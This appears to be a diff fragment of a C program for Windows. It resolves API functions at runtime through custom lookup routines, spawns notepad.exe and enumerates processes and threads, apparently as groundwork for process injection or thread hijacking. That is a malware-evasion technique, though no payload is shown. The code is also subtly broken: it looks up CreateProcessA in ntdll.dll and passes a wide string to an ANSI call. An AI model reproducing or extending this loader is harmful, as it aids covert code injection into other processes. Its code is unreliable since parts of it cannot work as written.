@@ -151,11 +151,11 @@ int main(int argc, char** argv, char* envp) {
 	g(" GetModHandle(ntdll.dll) = % p\n", kb);
 	size_t mb = GetModHandle(L"C:\\WINDOWS\\System32\\ntdll.dll");
 
+	size_t ptr_CreateProcessA = (size_t)GetFuncAddr(mb, L"CreateProcessA");
 	size_t ptr_CreateToolhelp32Snapshot = (size_t)GetFuncAddr(mb, L"CreateToolhelp32Snapshot");
 	size_t ptr_Process32First = (size_t)GetFuncAddr(mb, L"Process32First");
 	size_t ptr_Process32Next = (size_t)GetFuncAddr(mb, L"Process32Next");
 	size_t ptr_CloseHandle = (size_t)GetFuncAddr(mb, L"CloseHandle");
-
 
 
 	size_t ptr_NtOpenThread = (size_t)GetFuncAddr(kb,L"NtOpenThread");
@@ -174,10 +174,13 @@ int main(int argc, char** argv, char* envp) {
 	DWORD pid;
 	PVOID baseAddress = NULL;
 	ULONG n;
+	PROCESS_INFORMATION pi;
 	PCONTEXT CTX;
 	PROCESSENTRY32 dw;
 	dw.dwSize = sizeof(dw);
 
+
+	BOOL proc = ((BOOL(WINAPI*)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION))ptr_CreateProcessA)(L"C:\\Windows\\System32\\notepad.exe",NULL, NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi );
 	HANDLE snap = ((HANDLE(WINAPI*)(DWORD, DWORD))ptr_CreateToolhelp32Snapshot)(TH32CS_SNAPPROCESS, 0);
 
 	if(((BOOL(WINAPI*)(HANDLE, LPROCESSENTRY32))ptr_Process32First)(snap, &dw)==TRUE){
